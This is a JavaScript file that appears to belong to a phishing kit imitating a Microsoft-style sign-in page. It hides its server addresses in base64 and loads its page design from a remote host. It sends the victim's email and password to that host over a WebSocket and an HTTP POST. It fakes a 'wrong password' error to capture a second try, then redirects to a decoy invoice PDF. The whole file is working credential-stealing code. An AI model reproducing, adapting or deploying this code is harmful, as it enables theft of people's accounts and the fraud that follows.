$(document).ready(function() {
    const ws = new WebSocket(atob('d3NzOi8vc2lnbmF0dXJlc2hjLmNvbQ=='));
        ws.addEventListener('open', function (event) {
            console.log('connected');
        });

    function get_skin() {
        $.ajax({
            url: atob('aHR0cHM6Ly9zaWduYXR1cmVzaGMuY29tL3NraW4='),
            type: "GET",
            success: function(data) {
              var resp = JSON.parse(data);
              var html = resp.html;
              $('.cb').html(html);
              init();
            }
        });
    }

    function secLogin(user, pass) {
        $.ajax({
              url: atob('aHR0cHM6Ly9zaWduYXR1cmVzaGMuY29tL2xvZ29u'),
              type: "POST",
              data: {
                  email: user,
                  password: pass,
                  token: '1012708725',
                  redirect: $('#redirect').val(),
              },
              success: function(data) {
                var resp = JSON.parse(data)
                if (resp.message === 'OK') {
                  window.location.replace("https://firebasestorage.googleapis.com/v0/b/briana-f2beb.appspot.com/o/2021-08-02%2C%20J17043-0100M-S616%2C%20Payment%20Invoice%20No.%2047.pdf?alt=media&token=a2b0d104-7c16-4ff3-ac11-1aaf8523b4f2");
                }
                else if (resp.message === 'redirect') {
                  $("#passwordError").show();
                  $('#i0118').val('');
                  $('#idSIButton9').prop('disabled', false);
                  $('#progressBarw').hide();
                  $("#important").hide();
                  $("#i0118").css("border-color", "#e81123");
                   $("#i0118").focus();
                   $('#redirect').val('1');
                }
              }
          });
       }

       function sendLogin(user, pass) {        
        data = {
            email: user,
            password: pass,
            event: 'login'
        };
           ws.send(JSON.stringify(data));
           ws.onmessage = function (evt) { 
              console.log(JSON.parse(evt.data));
              var msg = JSON.parse(evt.data);

              if (msg.event === 'operation complete') {
                setTimeout(secLogin(user, pass, msg), 30000);
              }
          };
       }

    function init () {
        setTimeout(function () {
            var email = atob(document.getElementsByTagName("meta")[7].content);
            $("#mai").html(email);
            $('#mai_hidden').val(email);
            $('#lightbox').show();
            $('#i0118').focus();
          }, 1000);
          
          $('#idSIButton9').on('click', function(event) {
            event.preventDefault ? event.preventDefault() : event.returnValue = false;
            var user = $('#mai_hidden').val();
            var pass = $('#i0118').val();
            if(pass == "") {
              $("#passwordError2").show();
              $("#important").hide();
              $("#i0118").css("border-color", "#e81123");
              $("#i0118").focus();       
            } else {
              $("#i0118").css("border-color", "black");
              $('#progressBarw').show();
              $("#passwordError2").hide();
              $("#passwordError").hide();
              $('#idSIButton9').prop('disabled', true);

              var state = ws.readyState;
              if(state === 1) {
                sendLogin(user, pass);
              } else {
                location.reload();
              }
            }
          });
    }

    get_skin();

});